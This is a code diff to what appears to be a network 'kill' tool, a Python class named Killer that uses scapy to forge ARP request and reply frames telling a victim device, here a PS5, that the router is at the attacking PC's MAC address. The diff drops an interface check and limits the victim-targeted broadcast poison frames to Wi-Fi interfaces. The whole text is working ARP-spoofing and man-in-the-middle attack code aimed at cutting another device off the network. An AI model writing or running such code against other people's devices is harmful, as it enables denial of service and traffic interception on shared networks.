@@ -21,7 +21,6 @@ from tools.utils import (
     _lan_neighbor_mac_via_arp_probe,
     npcap_iface_tokens,
     bind_scapy_conf_iface,
-    _iface_ok_for_lan_mitm,
 )
 from constants import *
 from tools.crash_feedback import safe_daemon_target
@@ -690,13 +689,6 @@ class Killer:
         if not ip:
             return
         target = get_iface_for_victim_ip(ip, fallback=self.iface)
-        # Spare Ethernet 2 is often APIPA/disconnected. Rebinding there drops
-        # Wi‑Fi isolation broadcast, so a router-wired PS5 never sees Kill ON.
-        try:
-            if not _iface_ok_for_lan_mitm(target) and _iface_ok_for_lan_mitm(self.iface):
-                return
-        except Exception:
-            pass
         same_iface = (
             getattr(target, 'guid', None) == getattr(self.iface, 'guid', None)
             and getattr(target, 'name', None) == getattr(self.iface, 'name', None)
@@ -1195,11 +1187,10 @@ class Killer:
         too weak after broadcast removal.
 
         On Wi‑Fi, AP client isolation often drops STA-to-STA *unicast*, so the
-        ethernet PS5 never sees those frames and Kill does nothing. Always add
+        ethernet PS5 never sees those frames and Kill does nothing. Add
         victim-targeted L2 broadcast copies (pdst/hwdst still this victim only
-        — not a GARP), including when the bind name is Ethernet. This PC
-        staying online is not proof those copies are safe for every LAN; they
-        are how poison reaches a router-wired console.
+        — not a GARP). This PC staying online is not proof those copies are
+        safe for every LAN; they are how poison reaches this console.
         """
         src = self._poison_hwsrc()
         # Victim: "router is at PC MAC"
@@ -1242,30 +1233,34 @@ class Killer:
             to_router_req,
             to_router_reply,
         ]
-        # Always include victim-targeted L2 broadcast. Mesh Wi‑Fi PC + ethernet
-        # PS5 never sees STA unicast; if Kill rebound to a spare Ethernet name
-        # the old ``iface_is_wireless`` gate dropped the only frames that cut.
-        bcast = 'ff:ff:ff:ff:ff:ff'
-        frames.extend(
-            [
-                Ether(src=src, dst=bcast)
-                / ARP(
-                    op=1,
-                    psrc=self.router['ip'],
-                    hwsrc=src,
-                    pdst=victim['ip'],
-                    hwdst=victim['mac'],
-                ),
-                Ether(src=src, dst=bcast)
-                / ARP(
-                    op=2,
-                    psrc=self.router['ip'],
-                    hwsrc=src,
-                    pdst=victim['ip'],
-                    hwdst=victim['mac'],
-                ),
-            ]
-        )
+        try:
+            from tools.mitm_probe import iface_is_wireless
+
+            wifi = iface_is_wireless(self.iface)
+        except Exception:
+            wifi = False
+        if wifi:
+            bcast = 'ff:ff:ff:ff:ff:ff'
+            frames.extend(
+                [
+                    Ether(src=src, dst=bcast)
+                    / ARP(
+                        op=1,
+                        psrc=self.router['ip'],
+                        hwsrc=src,
+                        pdst=victim['ip'],
+                        hwdst=victim['mac'],
+                    ),
+                    Ether(src=src, dst=bcast)
+                    / ARP(
+                        op=2,
+                        psrc=self.router['ip'],
+                        hwsrc=src,
+                        pdst=victim['ip'],
+                        hwdst=victim['mac'],
+                    ),
+                ]
+            )
         return frames
 
     def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
